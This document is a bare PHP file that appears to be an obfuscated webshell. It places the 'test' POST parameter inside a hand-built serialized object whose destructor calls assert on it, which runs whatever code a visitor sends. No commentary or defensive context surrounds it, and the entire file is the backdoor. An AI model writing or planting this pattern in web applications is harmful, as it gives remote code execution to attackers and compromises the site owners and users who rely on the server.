<?php
class A{
    var $test = "demo";
    var $fun = "assert";
    function __destruct(){
        call_user_func($this->fun,$this->test);
    }
}
$test = $_POST['test'];
$len = strlen($test)+1;
$pp = "O:1:\"A\":1:{s:4:\"test\";s:".$len.":\"".$test.";\";}";
$test_unser = unserialize($pp);
?>
